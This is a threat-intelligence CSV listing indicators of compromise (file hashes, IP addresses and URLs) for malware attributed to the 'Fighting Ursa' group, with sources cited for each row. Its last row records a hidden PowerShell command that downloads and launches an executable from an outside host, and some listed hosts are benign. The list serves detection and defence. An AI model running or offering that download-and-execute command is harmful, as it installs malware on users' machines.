Attack / Operation / Campaign,Year of attack,IoC Class,IoC Type,IoC Subtype,Indicator,Source of info
,2014,Host,File,File hash SHA256,6507caba5835cad645ae80a081b98284032e286d97dabb98bbfeb76c3d51a094,https://analyze.intezer.com/analyses/f9267a17-ca5f-46f3-b601-8cffed4d7e46
,2023,Host,File,File hash SHA256,faaaf2817e31091048dfcb6b0377ff8d3aefca6a84d469060e9347047dff96cd,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2023,Host,File,File hash SHA256,c44f24e49697e8e008cdcfc852e483a920825855f8bbb7787517511280406a40,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2022,Host,File,File hash SHA256,091ffdfef9722804f33a2b1d0fe765d2c2b0c52ada6d8834fdf72d8cb67acc4b,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2022,Host,File,File hash SHA256,3f13286981b74fc02b6333448ee4cb249ec5763e33548ba119e5aa7ddc7b23d8,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2022,Host,File,File hash SHA256,e6b1afc6e60f5f853095bcb089c1c5d216b1fb24a36bca284e816a507c694545,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2022,Host,File,File hash SHA256,2d8f73c1f2e5b803ad6716644361c20b51ba49fa79361ef0bc1ae3a735968459,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2022,Host,File,File hash SHA256,00024a21978487418e37e5edb952e32b434702cc26b2d4f0b1fc73252aff3594,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2022,Host,File,File hash SHA256,df8a2477a91b6f566ca0762c907ef3c2fc527b4ab0a687556eabb44a806745bc,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2022,Host,File,File hash SHA256,3b0102e94a22bef70889a8ef737d1cd09e65160aea4b93d454e46c03e8fd3a87,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2022,Host,File,File hash SHA256,979c8553e6c279414abff9ce15a21a64394fcfc31f20d0e26b6666c168f63c10,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2022,Host,File,File hash SHA256,daaa271cee97853bf4e235b55cb34c1f03ea6f8d3c958f86728d41f418b0bf01,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2022,Host,File,File hash SHA256,2318ae5d7c23bf186b88abecf892e23ce199381b22c8eb216ad1616ee8877933,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2022,Host,File,File hash SHA256,5f5f915c39cdfa4a701f8d095e57b465cf48e07c100c164af4734c75bdeee5e3,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2022,Host,File,File hash SHA256,2396c9dac2184405f7d1f127bec88e56391e4315d4d2e5b951c795fdc1982d59,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2021,Host,File,File hash SHA256,5f5f915c39cdfa4a701f8d095e57b465cf48e07c100c164af4734c75bdeee5e3,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2021,Host,File,File hash SHA256,2396c9dac2184405f7d1f127bec88e56391e4315d4d2e5b951c795fdc1982d59,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2021,Host,File,File hash SHA256,980dc9d6bb2c7f5719101ddacfc75af0c6d4263510146c9762cd8eb6cd1824e0,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2021,Host,File,File hash SHA256,07b2d21f4ef077ccf16935e44864b96fa039f2e88c73b518930b6048f6baad74,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2021,Host,File,File hash SHA256,0269388e2f38a0a33a316cef7aa6a89622d3709b2aa2ff741631b8559f9cc642,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2021,Host,File,File hash SHA256,001cf7af29382f4f784fe45df131ca9e14908c6c0717899780f9354b8a5f0090,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2021,Host,File,File hash SHA256,ed8f52cdfc5f4c4be95a6b2e935661e00b50324bee5fe8974599743ccfd8daba,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2021,Host,File,File hash SHA256,f1e2bceae81ccd54777f7862c616f22b581b47e0dda5cb02d0a722168ef194a5,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2021,Host,File,File hash SHA256,b9f3af84a69cd39e2e10a86207f8612dd2839873c5839af533ffbc45fc56f809,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2021,Host,File,File hash SHA256,b6441ded7c948755b84d2c98bd7b3adf6381d1d3ce3bd46885f557bcf621f020,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Host,File,File hash SHA256,f36a0ee7f4ec23765bb28fbfa734e402042278864e246a54b8c4db6f58275662,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Host,File,File hash SHA256,6449d0cb1396d6feba7fb9e25fb20e9a0a5ef3e8623332844458d73057cf04a1,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Host,File,File hash SHA256,7f698295230f59c7ca8193322eb48d71cd203f3675139f2da99e326589bfdad3,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Host,File,File hash SHA256,12ffbb95a07a18f62d44bc713225334d45fb8455e01cb34182980a7d0bacc3f5,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Host,File,File hash SHA256,68df0f924ce79765573156eabffee3a7bb0fa972d2b67d12dd91dea3ec255d24,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Host,File,File hash SHA256,7820d1e05d6655d08705148624d06ba88c80395b73f0ee066cd7853ff90e24ff,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Host,File,File hash SHA256,0e52d65099557425fe9d775bb6601930a044d845ffdde0dd8237613a8ede8d2a,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Host,File,File hash SHA256,c4de410234461c938fff4c479f43272285730b0ae6c8ab64533a1629273c093a,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Host,File,File hash SHA256,e75678a596d4cd58d3514ea141fb6e85086f1c7f81395f42b7bb4bc10d87ffa4,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Host,File,File hash SHA256,f472419220ca4d0941ff119beb1c5cb6f63985fa09759eede6d7dbfc2a7a9d86,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Host,File,File hash SHA256,279b10838e10fc04211b561b4b253db0eebbea0772917dfd3b518a1574289fc4,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Host,File,File hash SHA256,ae2faf2c1ddf45b65d239fb920a543f25fb1e18a21b160dddb900f7a206f11fc,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Host,File,File hash SHA256,2867110268be1de7d2d32341535651b45916ded3f85c23e72db8ac22c6517cc0,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Host,File,File hash SHA256,e1f00a603ae4db1ede68f66fe31bf3f5ca8fc209fa98d2268c9a05cd2a14545b,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Host,File,File hash SHA256,ed31cb31a5d67a114b8aaa08836bf97ff34aa59fb14993135220c3dd9d05ce0a,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2022,Network,IP address,,18.133.249.238,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2022,Network,IP address,,162.241.216.236,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2022,Network,IP address,,157.56.161.162,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2021,Network,IP address,,172.67.178.213:443,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Network,IP address,,31.7.62.103,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Network,IP address,,77.75.78.48,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Network,IP address,,77.75.78.48:465,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Network,IP address,,140.82.121.9,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2020,Network,IP address,,140.82.121.9:443,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,IP address,,92.47.15.18:80,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,IP address,,77.75.76.48:465,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,IP address,,142.250.186.46:80,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,IP address,,172.253.116.105:443,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,IP address,,209.85.203.102:443,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,IP address,,67.225.218.6:80,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2018,Network,IP address,,93.113.131.155:80,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2018,Network,IP address,,109.248.148.42:80,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2018,Network,IP address,,52.45.178.122:443,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2018,Network,IP address,,192.168.122.205:49182,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2018,Network,IP address,,220.158.216.127,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2018,Network,IP address,,45.124.132.100,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2018,Network,IP address,,213.252.245.132:80,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2018,Network,IP address,,216.58.212.142:443,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2017,Network,IP address,,185.25.50.93,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2017,Network,IP address,,54.65.172.3,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2017,Network,IP address,,192.241.250.200:80,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://www.gorodpavlodar.kz/modules/Contact/Includes/1c.php,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,https://www.google.com/?gws_rd=ssl,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://google.com/jH/DtqaE/BTJX/Morlo8.vnd.dlna.mpeg-tts/?TP=gviCRJ4fES+YXF0YvGdnJaYeHA2NXRU=,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://servicecdp.com/ibVo/BD.parallel/?hBT=qlGOTba2HSaw9VERlM5rLI63EASl9Bk=,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://google.com/wbYd/njh/D2w5/mF7zw.vnd.ms-mediapackage/?HKM=6OSsPfQDP1byQHNh1ntJXMwCMnTnQTs=,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://servicecdp.com/7CRN1X/sk8/OFM12A/Ih/p82TW/6txw.ip-mr_v2.5/?Ztc=OnONxSaUHq4g11KZBOxopB6VE4w11ho=,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://google.com/Eoe9sN/GQ7Fp/mL.imdn+xml/?9=NxiMzSv/H6YtvFORCYdprBP+EoQ4vRs=,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://servicecdp.com/0/P.imdn+xml/?Wcf=piGqTbrGOSa8hXURmL5PLILHNASphD0=,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://servicecdp.com/Np/lYKsp/DH/KcTl19/VL4s7br.ip-mr_v2.5/?f=h6yDPZtLEFadCFxhuTNmXKNKHXSICRQ=,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://servicecdp.com/LL/hA9n/fTN/hNAR8/uu4pT0.vnd.flatland.3dml/?Kx6=8WLmSO2FdSPrxjkUz/0DKdWEeAH+x3E=,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://google.com/k/rLveE/B2F7.parallel/?R=4Vja6v2/SYH7/AW238c/i8W+RKPu/U0=,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://google.com/k/rLveE/B2F7.parallel/?R=4Vja6v2/SYH7/AW238c/i8W+RKPu/U0=,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://google.com/mf8/16P6/neTXcP.vnd.ms-mediapackage/?Kyz=wsMvK94kvEDYZ/B3/FzKSuYlsWLNZrg=,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://servicecdp.com/Oo2/lRnEJU/z/w/2nB/a.vnd.flatland.3dml/?7h=xvdhMNoQ8lvcU75s+GiEUeIR/3nJUvY=,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://google.com/nZ/sQH/XD3X.vnd.dvb.notif-ia-msglist+xml/?lVA=LjMG3DLUlbc0l9mAEKzjvQrVmJUhlpE=,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://servicecdp.com/RF/ZhGt/qlU9/wcx8/7r/0wIDrX9.vnd.ms-mediapackage/?rQ=mHbRWoSRQjGC0g4Gpuk0O7yQTxOX00Y=,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://servicecdp.com/E/BCvKF/j7Ji/Uh/2.vnd.dlna.mpeg-tts/?cXF=uLc/NaRQrF6iE+BphijaVJxRoXy3Eqg=,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://servicecdp.com/E/BCvKF/j7Ji/Uh/2.vnd.dlna.mpeg-tts/?cXF=uLc/NaRQrF6iE+BphijaVJxRoXy3Eqg=,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://eservicesystems.net/update/,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://microsofthelpcenter.info/update,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://1oo7.net/update,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://ii.haqo.net/u.png?ID=MIKE-PC&GUID=6CBE8079-360C-4481-A870-DDDB7AC63961&MAC=52:54:00:AE:C3:7D&OS=Windows%207&BIT=64&_T=1650029792,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://pp.abbny.com/u.png?ID=MIKE-PC&GUID=6CBE8079-360C-4481-A870-DDDB7AC63961&MAC=52:54:00:AE:C3:7D&OS=Windows%207&BIT=64&_T=1650033557,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://ii.haqo.net/u.png?ID=MIKE-PC&GUID=6CBE8079-360C-4481-A870-DDDB7AC63961&MAC=52:54:00:AE:C3:7D&OS=Windows%207&BIT=64&_T=1650033539,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
,2019,Network,URL,,http://93.113.131.155/Verifica-El-Lanzamiento/Ayuda-Del-Sistema/obtenerId.php?apurar=644F1DCB,https://analyze.intezer.com/families/4b0df7b0-b079-4a21-a72d-a35efabef6d8?tab=detect
Fighting Ursa,2018,Host,File,File hash SHA256,054c5aa73d6b6d293170785a82453446429c0efc742df75979b760682ac3026b,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,0cd9ac328d858d8d83c9eb73bfdc59a958873b3d71b24c888d7408d9512a41d7,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,12e6642cf6413bdf5388bee663080fa299591b2ba023d069286f3be9647547c8,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,174effcdeec0b84c67d7dc23351418f6fa4825550d595344214cc746f1a01c1a,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,215f7c08c2e3ef5835c7ebc9a329b04b8d5215773b7ebfc9fd755d93451ce1ae,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,2cfc4b3686511f959f14889d26d3d9a0d06e27ee2bb54c9afb1ada6b8205c55f,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,34bdb5b364358a07f598da4d26b30bac37e139a7dc2b9914debb3a16311f3ded,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,40318f3593bca859673827b88d65c5d2f0d80a76948be936a60bda67dff27be9,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,4405cfbf28e0dfafa9ea292e494f385592383d2476a9c49d12596b8d22a63c47,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,5173721f3054b92e6c0ff2a6a80e4741aa3639bc1906d8b615c3b014a7a1a8d7,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,5749eb9d7b8afa278be24a4db66f122aeb323eaa73a9c9e52d77ac3952da5e7d,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,5a02d4e5f6d6a89ad41554295114506540f0876e7288464e4a70c9ba51d24f12,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,651d5aab82e53711563ce074c047cbaa0703931673fa3ad20933d6a63c5c3b12,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,68df0f924ce79765573156eabffee3a7bb0fa972d2b67d12dd91dea3ec255d24,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,6ad3eb8b5622145a70bec67b3d14868a1c13864864afd651fe70689c95b1399a,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,77ff53211bd994293400cb3f93e3d3df6754d8d477cb76f52221704adebad83a,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,78adc8e5e4e86146317420fa3b2274c9805f6942c9973963467479cb1bbd4ead,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,79bd5f34867229176869572a027bd601bd8c0bc3f56d37443d403a6d1819a7e5,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,861b6bc1f9869017c48930af5848930dd037fb70fc506d8a7e43e1a0dbd1e8cb,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,9a0f00469d67bdb60f542fabb42e8d3a90c214b82f021ac6719c7f30e69ff0b9,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,a23261e2b693750a7009569df96ec4cf61e57acc9424c98d6fe1087ff8c659ce,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,abfc14f7f708f662046bfcad81a719c71a35a8dc5aa111407c2c93496e52db74,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,af77e845f1b0a3ae32cb5cfa53ff22cc9dae883f05200e18ad8e10d7a8106392,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,b41480d685a961ed033b932d9c363c2a08ad60af1d2b46d4f78b5469dc5d58e3,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,c20e5d56b35992fe74e92aebb09c40a9ec4f3d9b3c2a01efbe761fa7921dd97f,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,c91843a69dcf3fdad0dac1b2f0139d1bb072787a1cfcf7b6e34a96bc3c081d65,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,cac630c11c4bf6363c067fbf7741eae0ec70238d9c5e60d41f3ed8f65b56c1d1,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,cb85072e6ca66a29cb0b73659a0fe5ba2456d9ba0b52e3a4c89e86549bc6e2c7,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,d06be83a408f4796616b1c446e3637009d7691c131d121eb165c55bdd5ba50b4,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,e5aece694d740ebcb107921e890cccc5d7e8f42471f1c4ce108ecb5170ea1e92,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Host,File,File hash SHA256,ecc5805898e037c2ef9bc52ea6c6e59b537984f84c3d680c8436c6a38bdecdf4,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Network,IP address,,109.248.148.42,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Network,IP address,,145.249.105.165,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Network,IP address,,185.203.118.198,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Network,IP address,,188.241.58.170,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
Fighting Ursa,2018,Network,URL,,http://cdnverify.net/,https://unit42.paloaltonetworks.com/atoms/fighting-ursa/
,2018,Host,File,AV detect,Trojan[Backdoor]/MSIL.Apt28,https://www.virustotal.com/gui/file/9a0f00469d67bdb60f542fabb42e8d3a90c214b82f021ac6719c7f30e69ff0b9
,2018,Host,File,AV family name,"Zebrocy, Msil, Ursu",https://www.virustotal.com/gui/file/9a0f00469d67bdb60f542fabb42e8d3a90c214b82f021ac6719c7f30e69ff0b9
CredoMap,2022,Host,cmd line,,"cmd.exe /k powershell -NonInteractive -WindowStyle Hidden -NoProfile -command '& {iwr http://kompartpomiar.pl/grafika/SQLite.Interop.dll -OutFile ""C:\Users\$ENV:UserName\SQLite.Interop.dll"";iwr http://kompartpomiar.pl/grafika/docx.exe -OutFile ""C:\Users\$ENV:UserName\docx.exe"";Start-Process ""C:\Users\$ENV:UserName\docx.exe""}'",https://cert.gov.ua/article/341128
